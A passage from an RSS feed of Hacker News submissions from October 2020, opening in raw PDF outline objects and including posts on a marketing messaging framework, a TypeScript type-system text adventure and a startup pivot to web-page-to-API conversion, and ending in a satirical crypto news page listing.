/Prev 1096 0 R 
/Parent 1024 0 R 
/Dest [ 347 0 R /Fit ] 
/Title (4-01)
&gt;&gt; 
endobj
1098 0 obj
&lt;&lt; 
/Next 1099 0 R 
/Prev 1097 0 R 
/Parent 1024 0 R 
/Dest [ 352 0 R /Fit ] 
/Title (4-02)
&gt;&gt; 
endobj
1099 0 obj
&lt;&lt; 
/Next 1100 0 R 
/Prev 1098 0 R 
/Parent 1024 0 R 
/Dest [ 357 0 R /Fit ] 
/Title (4-03)
&gt;&gt; 
endobj
1100 0 obj
&lt;&lt; 
/Next 1101 0 R 
/Prev 1099 0 R 
/Parent 1024 0 R 
/Dest [ 362 0 R /Fit ] 
/Title (4-04)
&gt;&gt; 
endobj
1101 0 obj
&lt;&lt; 
/Next 1102 0 R 
/Prev 1100 0 R 
/Parent 1024 0 R 
/Dest [ 367 0 R /Fit ] 
/Title (4-05)
&gt;&gt; 
endobj
1102 0 obj
&lt;&lt; 
/Next 1103 0 R 
/Prev 1101 0 R 
/Parent 1024 0 R 
/Dest [ 372 0 R /Fit ] 
/Title (4-06)
&gt;&gt; 
endobj
1103 0 obj
&lt;&lt; 
/Next 1104 0 R 
/Prev 1102 0 R 
/Parent 1024 0 R 
/Dest [ 377 0 R /Fit ] 
/Title (4-07)
&gt;&gt; 
endobj
1104 0 obj
&lt;&lt; 
/Next 1105 0 R 
/Prev 1103 0 R 
/Parent 1024 0 R 
/Dest [ 382 0 R /Fit ] 
/Title (4-08)
&gt;&gt; 
endobj
1105 0 obj
&lt;&lt; 
/Next 1106 0 R 
/Prev 1104 0 R 
/Parent 1024 0 R 
/Dest [ 387 0 R /Fit ] 
/Title (4-09)
&gt;&gt; 
endobj
1106 0 obj
&lt;&lt; 
/Next 1107 0 R 
/Prev 1105 0 R 
/Parent 1024 0 R 
/Dest [ 392 0 R /Fit ] 
/Title (4-10)
&gt;&gt; 
endobj
1107 0 obj
&lt;&lt; 
/Next 1108 0 R 
/Prev 1106 0 R 
/Parent 1024 0 R 
/Dest [ 397 0 R /Fit ] 
/Title (4-11)
&gt;&gt; 
endobj
1108 0 obj
&lt;&lt; 
/Next 1109 0 R 
/Prev 1107 0 R 
/Parent 1024 …</div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://walden-family.com/impcode/BBN1822_Jan1976.pdf">https://walden-family.com/impcode/BBN1822_Jan1976.pdf</a></em></p>]]>
            </description>
            <link>https://walden-family.com/impcode/BBN1822_Jan1976.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-24949100</guid>
            <pubDate>Sat, 31 Oct 2020 04:20:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Last Marketing Framework You'll Ever Need]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24948930">thread link</a>) | @mooreds
<br/>
October 30, 2020 | https://www.reifyworks.com/writing/2020-10-14-introducing-the-vsf | <a href="https://web.archive.org/web/*/https://www.reifyworks.com/writing/2020-10-14-introducing-the-vsf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper">

      


      <main id="main">
        
        <div>

          <div>
            <div>
              <div>
                

                <div>
                  <p>When we started Reify, the idea was pretty simple – let’s take the experience we’ve gained as marketers at developer facing companies, and apply that knowledge to as many software companies as we can. Let’s raise the tide for everyone, and help everyone become better marketers. After more than 4 years and 75 clients, we’re extremely happy with the results, and it felt like the right time to take a step back, consider what we’ve accomplished and learned (and, glaringly, what mistakes we made), and try to do what every great marketer and consultant loves to do: define a framework.</p>

<p>Our first few clients, bless their souls, were very patient with us as we slowly but surely codified our methods. What started as a somewhat amorphous (but very enthusiastic, and usually quite successful somehow) “process” turned into a repeatable set of working sessions, asynchronous assignments for our clients, and research and synthesis on our parts. We figured out just the right way to start with the stakeholders, document their story, do the hard work, and then end up with a <em>messaging framework that succinctly and successfully communicated the value of the product</em>.</p>

<p>Once we settled on the basic outline of the process, we did it again. And again. And again. We’ve done this essential, foundational marketing engagement with more than 75 companies, from solo bootstrapped founders to public companies, and everything in-between. We expanded our initial notion of working with developer facing companies to working with a wide range of companies from <a href="https://testdouble.com/">award-winning software consultancies</a> to <a href="https://getchannels.com/">TV tech plays</a>, and even <a href="https://omg.network/">blockchain tech</a> (a category that barely existed when we started the company). We partnered with <a href="https://www.brightscout.com/">fabulous designers</a>, <a href="https://devrelate.io/">top content producers and community builders</a>, <a href="https://www.heavybit.com/">VC firms and event producers</a>, and we even started a <a href="https://epicconf.com/">little online conference with our friends.</a></p>

<p>Throughout all of this work, one thing remained very clear:</p>

<blockquote>
  <p>Nothing is more important than the story.</p>
</blockquote>

<p>And so it was a few months back when Brian and I tried to finally put a name to this process we’ve developed that we settled on a name: The Value Story Framework (VSF). This post will focus on what the VSF is, and it will be followed by another post outlining how the VSF can be put to use in nearly any company to start with solid foundations, set reasonable goals, and execute marketing like a pro.</p>

<center><img src="https://www.reifyworks.com/images/vsf1.png"></center>



<h2 id="the-value-story-framework">The Value Story Framework</h2>

<p>The VSF has three concrete outputs:</p>

<ul>
  <li>The <em>value story</em>, which sums up the <em>Why</em> of the product</li>
  <li>The <em>refined persona</em>, which describes the <em>Who</em>, based on the essentials uncovered in the value story</li>
  <li>The <em>messaging framework</em>, which contains the words used to describe <em>What</em>, <em>Why</em>, and <em>How</em> to the refined persona</li>
</ul>

<p>One of the keys to the VSF is that <em>these outputs are entirely driven by inputs from the company’s key stakeholders</em>. We often tell our clients that they will have all of the good ideas during this process, and our job is to massage words, curate ideas, and present a complete, consistent package of ideas – something that can be difficult to do if you’ve never done it before.</p>

<p>The value story’s inputs come in the form of answering a series of questions about the origins of the company, focused initially on understanding <em>why</em> the people responsible for forming it came together. Beyond that, a timeline is established, and we also ask questions about other key factors: we get to know the competitive landscape a bit, we discuss important customers, and we discuss companies our clients admire and learn why.</p>

<p>Once we’ve established your <em>value story</em>, we move on to the <em>refined persona</em>. This persona document, which we’ve written about a few times over the years, is designed to allow you to focus in on what really matters when deciding what kind of marketing to do, when to do it, and what kind of content you need to produce. We ask stakeholders to list the key challenges of skills of the target persona, to consider what other tools they use and love, to tell us everything they know about what key roles and responsibilities that individual has at work. Once we’ve honed in on the <em>one initial persona</em> we’re going to use, we give it a memorable nickname and then move on to the part that most people actually think about when they think about marketing: messaging and positioning.</p>

<p>Our <em>messaging framework</em> itself is nothing unique – in fact we cribbed the structure of it by combining two different frameworks we found on the internet back when we were both marketing practitioners 5+ years ago. What does differentiate our process, however, is the process itself. While marketing is often done by thinking of cool sounding phrases and interesting angles first, and then matching the product’s marketing to it, we take the opposite approach.</p>

<blockquote>
  <p>Use your story, focus on your persona, deliver your message</p>
</blockquote>

<p>We ask our clients to, <em>while considering the persona very closely</em>, produce lists of examples that support the basic argument that your product is a great fit for this persona. The messaging framework is assembled by combining existing facts about the product, aimed directly at the persona, in a way that leads us and the clients naturally to the great sounding slogans that companies often come to us in search of.</p>

<h2 id="prove-it">Prove it!</h2>

<p>We’ve been around a while, and worked with a decent number of clients you may have heard of, but the proof is in the pudding, right? How do you know that this stuff works at all? Beyond the fact that clients of ours who have used our frameworks directly have gone on to raise hundreds of millions of dollars in venture capital, added at least that much in revenue, come to dominate their own market niches, etc., nothing communicates out impact as effectively as their own words. To that end, here are some of our favorite client quotes:</p>

<blockquote>
  <p>“Reify’s marketing framework helped us discover and communicate the value of FireHydrant in a way that has really resonated with our core audience.” – Robert Ross, CEO, FireHydrant</p>
</blockquote>

<blockquote>
  <p>“Determined AI is a technically complicated product, and communicating our value proposition early on was always a challenge. Reify’s frameworks helped us calibrate, and we went to market with messaging that helped us communicate clearly and effectively.” – <em>Evan Sparks, Founder and CEO, Determined AI</em></p>
</blockquote>

<blockquote>
  <p>“Reify helped us develop a messaging framework that not only enabled us to level up how we communicate with our customers, but was also instrumental in telling the story that resulted in our recent Series A financing. We have a confidence and focus now that we didn’t before.” - <em>Caleb Hailey, CEO, Sensu</em></p>
</blockquote>

<p>And just because we love them so much, here are some of the great brand promises we’ve helped our clients come up with, in the context of any software company’s core marketing asset, the website homepage:</p>

<center><img src="https://www.reifyworks.com/images/hero_sanity.png"></center>

<center><img src="https://www.reifyworks.com/images/hero_td.png"></center>

<center><img src="https://www.reifyworks.com/images/hero_stackbit.png"></center>

<p>And there are tons more.</p>

<h2 id="so--how-do-i-use-it">So … How Do I Use It?</h2>

<p>We’re working on a few different ways to share the VSF with the world. The first step will be a followup to this post, which will contextualize the Value Story, Refined Persona, and Messaging Framework in day to day marketing operations. After that, we’re planning on opening up a software platform version of our framework that will allow <em>anyone to leverage these tools</em> to become the awesome marketers we know they’re capable of. Yes, after all this time teaching people how to fish, we’re going to be fishing ourselves a bit – and making a small software product to sell to early marketing teams. Sound cool? <strong><a href="https://calendly.com/briandoll/reify-chat">Book a 30-min Session with Reify Right Now</a></strong> to learn more!</p>


                  <hr>
                  <br>
                  
<br>


                </div>

              </div>
            </div>
          </div>
        </div>

      </main>

      
    </div></div>]]>
            </description>
            <link>https://www.reifyworks.com/writing/2020-10-14-introducing-the-vsf</link>
            <guid isPermaLink="false">hacker-news-small-sites-24948930</guid>
            <pubDate>Sat, 31 Oct 2020 03:26:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: TypeScript Hack – Type System Text Adventure]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24948911">thread link</a>) | @ricksharp
<br/>
October 30, 2020 | https://ricklove.me/typescript-type-system-adventure | <a href="https://web.archive.org/web/*/https://ricklove.me/typescript-type-system-adventure">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><span><span>title</span><span>Typescript Type System Adventure</span></span><span><span>date</span><span>2020-10-24</span></span><span><span>path</span><span>/typescript-type-system-adventure</span></span><span><span>author</span><span>Rick Love</span></span><span><span>excerpt</span><span>Text Adventure implemented in the Typescript Type System and Vscode JsDoc Viewer</span></span><span><span>image</span><span>game-screenshot-06-large.png</span></span><span><span>tags</span><span>typescript, type-system, vscode, jsdoc, markdown, hacks, demo, games, text-adventure</span></span></p><div><div><p>tl;dr: Play a text adventure in vscode with the typescript type system.</p><h3>Update - Added Typescript 4.1 Template String Literals</h3><p><span><img src="https://ricklove.me/blog-content/posts/2020-10-24-typescript-type-system-adventure/typescript-4-1-features.png"></span></p><ul><li><a href="https://github.com/ricklove/rick-love-master/blob/70644a0f6cebf48132fc029e484e6f8db9e3fc19/code/typescript-type-system-adventure/game-type-system.ts#L123">Source on Github</a></li></ul><h3>Summary</h3><p>I've always been a fan of text adventures since I first played Space Quest 1 when I was about 6 (though it was a graphical text adventure technically).</p><p>I've also always been a huge fan of typescript since it came out in 2012.</p><p>Now, since Typescript 4.1 is adding the powerful template-literal-types, I figured I could do something fun with them.</p><p>(I got the idea from here: <a href="https://github.com/codemix/ts-sql">https://github.com/codemix/ts-sql</a>)</p><p>It occured to me, "Hey! Why not a text adventure!"</p><p>Now, it turns out that the way I implemented this game, I don't need the 4.1 features. I'll probably add that in the future to support more dynamic command parsing.</p><p>If you have <code>vscode</code>, you can play now with a quick <code>npm install</code> into any node project. (See below for full installation instructions.)</p><h3>So What?</h3><p>This is a level 99 typescript wizardry demo. </p><p>If you aren't a typescript nerd, you might miss the significance of this, but here is the basic idea:</p><p>First of all, everything you see here is running in the vscode code editor (without any program running). In fact, you can't even run my code. If you compile it to javascript, this is what you will get:</p><div><div><div><div><pre><code><span>export</span> <span>const</span> gameStart = <span>null</span>;</code></pre></div></div></div><p><span>➖</span></p><p><span>➕</span></p></div><p>(There might be a little more debris then that, but you get the idea.)</p><p>This screenshot should make it clear that the typescript type system is doing all the work:</p><p><span><img src="https://ricklove.me/blog-content/posts/2020-10-24-typescript-type-system-adventure/game-screenshot-04-type-only.png"></span></p><p>However, it's not very convenient to declare all those StepNN types, so I made a fluent mode that reduces the need for those:</p><p><span><img src="https://ricklove.me/blog-content/posts/2020-10-24-typescript-type-system-adventure/game-screenshot-01.png"></span></p><p>There is also an easy mode that uses only an object tree. It was very easy to make, but autocomplete ruins the fun by giving all the answers away. </p><p><span><img src="https://ricklove.me/blog-content/posts/2020-10-24-typescript-type-system-adventure/game-screenshot-05-easy.png"></span></p><p>In the process of making the game, I discoved that vscode supports jsdoc markdown. So I decided to use that for the game output since it is so rich. It even supports images:</p><p><span><img src="https://ricklove.me/blog-content/posts/2020-10-24-typescript-type-system-adventure/game-screenshot-03.png"></span></p><h3>Features</h3><ul><li>Play in vscode using autocomplete and tooltips</li><li>Game output displayed in tooltips using jsdoc3 with markdown (including gifs)</li><li>Implemented using conditional types, string literals, and a minimal state machine</li></ul><h3>How to play</h3><ul><li><code>npm i @ricklove/typescript-type-system-adventure</code></li><li>Create a new <code>play.ts</code> file and add the below code</li><li>Hover over <code>execute</code> to see game output (see screenshots for examples)</li></ul><div><div><div><div><pre><code><span>import</span> { gameStart } <span>from</span> <span>'@ricklove/typescript-type-system-adventure'</span>;

<span>const</span> play = <span><span>()</span> =&gt;</span> {

    <span>return</span> gameStart
        .command(<span>'look'</span>).execute
};</code></pre></div></div></div><p><span>➖</span></p><p><span>➕</span></p></div><h3>Tips:</h3><ul><li><code>.command('look').execute</code> will give you an idea of what to do next</li><li><code>.command('help').execute</code> if you get stuck</li><li>If you really get stuck, just hit F12 and read the source code</li><li>You can also play the easy mode with this starter:</li></ul><div><div><div><div><pre><code><span>import</span> { gameStartEasy } <span>from</span> <span>'@ricklove/typescript-type-system-adventure'</span>;

<span>const</span> playEasyMode = <span><span>()</span> =&gt;</span> {
    gameStartEasy
        .begin()
        .look()
};</code></pre></div></div></div><p><span>➖</span></p><p><span>➕</span></p></div><h3>Screenshots</h3><p><span><img src="https://ricklove.me/blog-content/posts/2020-10-24-typescript-type-system-adventure/game-screenshot-01.png"></span></p><p><span><img src="https://ricklove.me/blog-content/posts/2020-10-24-typescript-type-system-adventure/game-screenshot-02.png"></span></p><p><span><img src="https://ricklove.me/blog-content/posts/2020-10-24-typescript-type-system-adventure/game-screenshot-03.png"></span></p><p><span><img src="https://ricklove.me/blog-content/posts/2020-10-24-typescript-type-system-adventure/game-screenshot-04-type-only.png"></span></p><p><span><img src="https://ricklove.me/blog-content/posts/2020-10-24-typescript-type-system-adventure/game-screenshot-05-easy.png"></span></p><p><span><img src="https://ricklove.me/blog-content/posts/2020-10-24-typescript-type-system-adventure/game-screenshot-06-large.png"></span></p><h3>Source Code</h3><p><a href="https://github.com/ricklove/rick-love-master/tree/master/code/typescript-type-system-adventure">https://github.com/ricklove/rick-love-master/tree/master/code/typescript-type-system-adventure</a></p></div></div></div>]]>
            </description>
            <link>https://ricklove.me/typescript-type-system-adventure</link>
            <guid isPermaLink="false">hacker-news-small-sites-24948911</guid>
            <pubDate>Sat, 31 Oct 2020 03:22:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Better Mousetrap – Converting WebPages to Web APIs]]>
            </title>
            <description>
<![CDATA[
Score 63 | Comments 21 (<a href="https://news.ycombinator.com/item?id=24948779">thread link</a>) | @shanselman
<br/>
October 30, 2020 | https://turnerj.com/blog/a-better-mousetrap | <a href="https://web.archive.org/web/*/https://turnerj.com/blog/a-better-mousetrap">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="article">
<p>Today is a big day for me as after many months (or years depending how you look at it), I've <a href="https://www.producthunt.com/posts/brandvantage">finally launched the first product for my business, BrandVantage</a>.
This post is the story of how I started with one idea and ended up launching with a different one.</p>
<h2>The Original Idea: Let's build a digital brand expert!</h2>
<p>I worked as a web developer for a local web development agency for a number of years and in that time, I learnt a lot about how a variety of different businesses operated online.</p>
<p>There were a few key "problems" I found in common across many of those businesses:</p>
<ul>
<li>Under-utilising analytics</li>
<li>Misunderstanding analytics</li>
<li>Not keeping on top of industry information</li>
<li>Lack of competitor analysis/understanding</li>
<li>Difficulty with Search Engine Optimization (SEO)</li>
</ul>
<p>In moderate-to-large companies where you have marketing departments, most of this stuff can be covered by one or more staff dedicated to these things.
In smaller companies, the business owner is normally the one where these tasks fall on to, but they are already wearing many different hats.
It felt like something was here - if I could automate some of these tasks in different ways, I could both help business owners and earn myself some money along the way.</p>
<p>Automation of tasks, especially ones in analytics or SEO spaces, isn't a new idea.
In fact, I've seen many businesses in a similar space launch on Product Hunt over the years since starting, but that didn't deter me.
I was building <a href="https://idioms.thefreedictionary.com/a+better+mousetrap"><em>a better mousetrap</em></a> and wanting to launch it at a lower price, not something truly innovative so it was going to be an uphill battle.
This area though, helping small businesses online be as efficient in tasks as some bigger businesses can, is something I felt passionately about so I proceeded anyway.</p>
<h3>Attempt One: Very Hacky (in PHP)</h3>
<p>Way back in 2015/16/17, while still at my full-time job, I spent nights and weekends building and tinkering on solutions to the problems business owners face.
It was a hacky PHP solution pulling real-time information from sources like Twitter, Google Analytics and Facebook.
A hacky approach seemed like a good idea as that seemed to be the way people launched things, do the quickest and hackiest thing you can to get it out the door.</p>
<p>While working on it, I had a few interested parties though what I built could barely be considered a prototype.
The thing was a mess.
I could do some basic queries, but it wasn't what I considered sellable and definitely not user-friendly, something I considered key to the product.
I was also running into technical problems with scale - any sufficiently complex query was performed real-time, which was getting more complicated.
Real-time processing had to be out.
I needed to pre-compute and store it in a database.</p>
<p>I wanted to take this more seriously and I didn't feel like a "quick and hacky" approach to building a product was right for me.
With this in mind, it seemed like a good opportunity to change the tech stack to something that would be better long term.</p>
<h3>Attempt Two: Slightly Less Hacky (in .NET)</h3>
<p>Moving to .NET felt like the smart move for me as at my job I had spent a lot more time working in .NET than PHP, plus I vastly prefered the tooling in .NET vs PHP.
That said, the .NET code I had worked on to-date would definitely be considered "legacy code".</p>
<p>My first version in .NET (specifically .NET Framework), predating my use of version control, was trying to keep costs low by using MySQL through Entity Framework.
After a lot of pain and suffering with that, I had a short stint of MSSQL before I settled upon MongoDB.</p>
<p>MongoDB might seem like a weird choice - there are some people that have very strong opinions about which type of database you should use.
Honestly it came down to a gut feel after messing around with it - it seemed more compatible to the way I was approaching problems than a relational database would.
I liked the code-first approach to Entity Framework so much though that I recreated the "feel" of Entity Framework for MongoDB with some custom code.
This later became an open source project of mine called <a href="https://www.mongoframework.com/">MongoFramework</a>.</p>
<p>I'm not going to lie, progress was... slow.
While I was putting quite a lot of time into working on it, it was still an extremely ambitious project.
I have strong feelings about building "MVPs" where some people focus too much on the "minimum" without enough focus on the "viable".
At the end of the day people buy products that meet their needs, and cutting too much out would meet no-ones needs.
If someone was going to use this, in a market with many competitors of varying quality, it had to do its job well.
There didn't seem much I could reasonably cut to make it any more minimal if I wanted people to buy it.</p>
<p>I kept working at it every night, building pieces to extract and store data from a variety of sources.
I was pulling in data from Google Analytics, Google Webmaster Tools (now called Google Search Console), Twitter, Facebook, IP Geolocation, DNS information and also from news articles.
What I thought I could do is once I had the different data sources together, I would write custom rules that could infer insights from individual or combined data sets.
These insights would form the basis of the "digital brand expert".
After all, that was the goal of the idea, something that could help out small business owners.</p>
<p>After 2 years of working on this in my spare time, it felt the right time to leave my job and go into this full time.
I felt like I was <em>so close</em> to launching and I just needed something more than the same day-to-day work.
So I did it - <a href="https://turnerj.com/blog/i-left-my-job-today-after-seven-years">I left my job after 7 years</a>.</p>
<h3>Going Full-time into the Idea</h3>
<p>Right out of the gate, I had moved from .NET Framework to .NET Core, was working on UI/UX improvements for the application and launched the website for it.
I worked with an accountant and a lawyer to setup the business, bought a trade mark for the product name, and I felt good like I was only a few months away from launching.
This feeling didn't last though...</p>
<p>Over time, it felt like I was taking two steps forward then one step back - some technical, some business related.
Sure, that is still progress, but having new issues crop up every day or so can really crush your motivation.</p>
<p>My best/happiest/most productive days were days I ignored or avoided different issues I had.
If I had a problem with the login system, I would focus on how the UX of the menus worked.
If I had a problem with data gathering, I would add more tests to the codebase.
While I didn't entirely ignore the problem, I would wait a week or two before I looked at it again, somewhat hoping it would solve itself - unfortunately that isn't how things work.</p>
<p>In time though, I got to a stage where it felt like I could launch and was hyping myself up until reality struck: I didn't actually build what I set out to build.</p>
<p>The UI/UX was good, I had strategies for deployment and plans for next steps, but it wasn't a "digital brand expert".
It was instead a glorified data store for information that people could better access through existing tools.
That's kinda a big problem!</p>
<p><img src="https://turnerj.com/blog/2020/images/a-better-mousetrap-ive-made-a-huge-mistake.gif" alt="Gob Bluth saying &quot;I've made a huge mistake.&quot; from the TV Show &quot;Arrested Development&quot;"></p>
<p>When realising this I poured time into fixing that huge lapse in judgement, but I couldn't do it.
No matter how I tried, I just couldn't figure out how to build this rules engine.
It was like my entire thought process was just clouded.
I couldn't see the solution to the problem like I can for most other things.</p>
<p>This was depressing and I ended up having a month or so hiatus from working on it.
When I have had stints of not feeling like or not being able to do programming in the past, I try and spur it on again by watching some show or movie which has some strong relation to technology (fictional or not).
My go-to is usually something like <a href="https://www.imdb.com/title/tt0371746/">Iron Man</a>, but this time I was rewatching <a href="https://www.imdb.com/title/tt2543312/">Halt and Catch Fire</a> where I found some inspiration.</p>
<h2>The Pivot: An API to the Internet</h2>
<p>Later in the series a lot of the focus is around the Web, and it was in these episodes where my thoughts about the Internet and the data on it have changed.
There is a quote from one of the main characters at the end of Season 3 that resonates with me:</p>
<div>
<blockquote>
<p>"The moment we decide what the Web is, we've lost. The moment we try to tell people what to do with it, we've lost.
All we have to do is build a door and let them inside."</p>
<p>- Joe MacMillan (Season 3, Episode 10)</p>
</blockquote>
</div>
<p>The Internet is a treasure trove of information, it is searchable but generally unstructured.
People have managed to create all sorts of different pages in HTML, but in the process of making a website everything is designed for a human user.
It is this way for obvious reasons, <em>we</em> are the consumers of web pages after all... aren't we?</p>
<p>Behind these user-friendly web pages are usually other specific bits of markup, providing some level of structured data for specific situations.
Sometimes it is a description metatag for search engines, other times it might be <a href="https://ogp.me/">Open Graph</a> metatags for social media links.
We build these things to help aid computers processing our web pages.</p>
<p>In 2011, <a href="https://schema.org/">Schema.org</a> was created.
This was a collaborative effort between Google, Bing and Yahoo (later that year, Yandex as well) with the mission to "create, maintain, and promote schemas for structured data on the Internet, on web pages, in email messages, and beyond".
Through 3 different encodings (<a href="https://turnerj.com/blog/what-is-microdata-and-why-should-i-care">Microdata</a>, <a href="http://rdfa.info/">RDFa</a> and <a href="https://json-ld.org/">JSON-LD</a>), websites could express detailed structured data.</p>
<p>There is another quote from Halt and Catch Fire which I like:</p>
<div>
<blockquote>
<p>"Computers aren't the thing. They're the thing that gets us to the thing."</p>
<p>- Joe MacMillan (Season 1, Episode 1)</p>
</blockquote>
</div>
<p>As much as I like computers and programming, they are used to help us achieve other goals.
From my attempts of trying to build a "digital brand expert", I knew that data is fundamental to help build more advanced systems and give new insights.
Having easier access to other forms of data from web pages around the world may allow new and different tools to be built.</p>
<p>So I decided rather than try and solve a problem that I was clouded by, I …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://turnerj.com/blog/a-better-mousetrap">https://turnerj.com/blog/a-better-mousetrap</a></em></p>]]>
            </description>
            <link>https://turnerj.com/blog/a-better-mousetrap</link>
            <guid isPermaLink="false">hacker-news-small-sites-24948779</guid>
            <pubDate>Sat, 31 Oct 2020 02:49:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: The Onion for Crypto]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24948746">thread link</a>) | @npguy
<br/>
October 30, 2020 | http://doublespend.io/index.php | <a href="https://web.archive.org/web/*/http://doublespend.io/index.php">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main">
				<div>
			<div>
		<div>
			<section id="colormag_featured_posts_widget-4">
		<div>
			<div>
				<figure><a href="https://doublespend.io/2020/11/02/cryptotwitter-busy-finalizing-positive-bitcoin-tweets-for-tuesday/" title="CryptoTwitter Busy Finalizing Positive Bitcoin Tweets For Tuesday"><img width="390" height="205" src="https://doublespend.io/wp-content/uploads/2020/11/CT-390x205.png" alt="CryptoTwitter Busy Finalizing Positive Bitcoin Tweets For Tuesday" loading="lazy" title="CryptoTwitter Busy Finalizing Positive Bitcoin Tweets For Tuesday"></a></figure>
				<div>
					<div><p><span><a href="https://doublespend.io/category/bitcoin/" rel="category tag">Bitcoin</a>&nbsp;<a href="https://doublespend.io/category/top-stories/" rel="category tag">TOP STORY</a>&nbsp;</span></p></div>		<h3>
			<a href="https://doublespend.io/2020/11/02/cryptotwitter-busy-finalizing-positive-bitcoin-tweets-for-tuesday/" title="CryptoTwitter Busy Finalizing Positive Bitcoin Tweets For Tuesday">
				CryptoTwitter Busy Finalizing Positive Bitcoin Tweets For Tuesday			</a>
		</h3>
		<div><p><span><a href="https://doublespend.io/2020/11/02/cryptotwitter-busy-finalizing-positive-bitcoin-tweets-for-tuesday/" title="5:59 am" rel="bookmark"><i></i> <time datetime="2020-11-02T05:59:43+00:00">November 2, 2020</time><time datetime="2020-11-02T05:59:45+00:00">November 2, 2020</time></a></span>
		<span>
			<span>
				<i></i>
				<a href="https://doublespend.io/author/hoddler/" title="Matt Hoddler">
					Matt Hoddler				</a>
			</span>
		</span>

		
		</p></div>
											<p>“We need to get it back to 20K so we can get out. Its actually a simple process – Get it to 20K, Talk about 100K and Get out as fast as you can” </p>
									</div>

			</div>
			</div><div>
			<div>
				<figure><a href="https://doublespend.io/2020/10/31/coinbase-card-users-to-get-a-headache-treatment-pack-free-with-every-transaction/" title="Coinbase Card Users To Get A Headache Treatment Pack Free With Every Transaction"><img width="130" height="90" src="https://doublespend.io/wp-content/uploads/2020/10/headachepill-2-130x90.jpeg" alt="Coinbase Card Users To Get A Headache Treatment Pack Free With Every Transaction" loading="lazy" title="Coinbase Card Users To Get A Headache Treatment Pack Free With Every Transaction" srcset="https://doublespend.io/wp-content/uploads/2020/10/headachepill-2-130x90.jpeg 130w, https://doublespend.io/wp-content/uploads/2020/10/headachepill-2-392x272.jpeg 392w" sizes="(max-width: 130px) 100vw, 130px"></a></figure>
				<div>
					<div><p><span><a href="https://doublespend.io/category/top-stories/" rel="category tag">TOP STORY</a>&nbsp;</span></p></div>		<h3>
			<a href="https://doublespend.io/2020/10/31/coinbase-card-users-to-get-a-headache-treatment-pack-free-with-every-transaction/" title="Coinbase Card Users To Get A Headache Treatment Pack Free With Every Transaction">
				Coinbase Card Users To Get A Headache Treatment Pack Free With Every Transaction			</a>
		</h3>
		<div><p><span><a href="https://doublespend.io/2020/10/31/coinbase-card-users-to-get-a-headache-treatment-pack-free-with-every-transaction/" title="5:45 am" rel="bookmark"><i></i> <time datetime="2020-10-31T05:45:19+00:00">October 31, 2020</time><time datetime="2020-11-01T03:44:34+00:00">November 1, 2020</time></a></span>
		<span>
			<span>
				<i></i>
				<a href="https://doublespend.io/author/nakaboto/" title="Sat Nakaboto">
					Sat Nakaboto				</a>
			</span>
		</span>

		
		</p></div>
									</div>

			</div>
			
			<div>
				<figure><a href="https://doublespend.io/2020/10/28/breaking-object-floating-in-atlantic-could-be-carrying-funds-raised-in-eos-ico/" title="Object Floating In Atlantic Ocean Could Contain EOS’ ICO Funds: Sources"><img width="130" height="90" src="https://doublespend.io/wp-content/uploads/2020/10/eos-130x90.jpg" alt="Object Floating In Atlantic Ocean Could Contain EOS’ ICO Funds: Sources" loading="lazy" title="Object Floating In Atlantic Ocean Could Contain EOS’ ICO Funds: Sources" srcset="https://doublespend.io/wp-content/uploads/2020/10/eos-130x90.jpg 130w, https://doublespend.io/wp-content/uploads/2020/10/eos-392x272.jpg 392w" sizes="(max-width: 130px) 100vw, 130px"></a></figure>
				<div>
					<div><p><span><a href="https://doublespend.io/category/ico/" rel="category tag">ICO</a>&nbsp;<a href="https://doublespend.io/category/top-stories/" rel="category tag">TOP STORY</a>&nbsp;</span></p></div>		<h3>
			<a href="https://doublespend.io/2020/10/28/breaking-object-floating-in-atlantic-could-be-carrying-funds-raised-in-eos-ico/" title="Object Floating In Atlantic Ocean Could Contain EOS’ ICO Funds: Sources">
				Object Floating In Atlantic Ocean Could Contain EOS’ ICO Funds: Sources			</a>
		</h3>
		<div><p><span><a href="https://doublespend.io/2020/10/28/breaking-object-floating-in-atlantic-could-be-carrying-funds-raised-in-eos-ico/" title="5:12 am" rel="bookmark"><i></i> <time datetime="2020-10-28T05:12:46+00:00">October 28, 2020</time><time datetime="2020-10-29T20:16:23+00:00">October 29, 2020</time></a></span>
		<span>
			<span>
				<i></i>
				<a href="https://doublespend.io/author/nakaboto/" title="Sat Nakaboto">
					Sat Nakaboto				</a>
			</span>
		</span>

					<span>
				<i></i><a href="https://doublespend.io/2020/10/28/breaking-object-floating-in-atlantic-could-be-carrying-funds-raised-in-eos-ico/#respond">0</a>			</span>
		
		</p></div>
									</div>

			</div>
			
			<div>
				<figure><a href="https://doublespend.io/2020/10/28/kayaking-adventurous-sport/" title="PayPal CEO Praises Regulatory Scenario In Crypto"><img width="130" height="90" src="https://doublespend.io/wp-content/uploads/2015/03/paypal-130x90.jpg" alt="PayPal CEO Praises Regulatory Scenario In Crypto" loading="lazy" title="PayPal CEO Praises Regulatory Scenario In Crypto" srcset="https://doublespend.io/wp-content/uploads/2015/03/paypal-130x90.jpg 130w, https://doublespend.io/wp-content/uploads/2015/03/paypal-392x272.jpg 392w" sizes="(max-width: 130px) 100vw, 130px"></a></figure>
				<div>
					<div><p><span><a href="https://doublespend.io/category/regulation/" rel="category tag">Regulation</a>&nbsp;<a href="https://doublespend.io/category/top-stories/" rel="category tag">TOP STORY</a>&nbsp;</span></p></div>		<h3>
			<a href="https://doublespend.io/2020/10/28/kayaking-adventurous-sport/" title="PayPal CEO Praises Regulatory Scenario In Crypto">
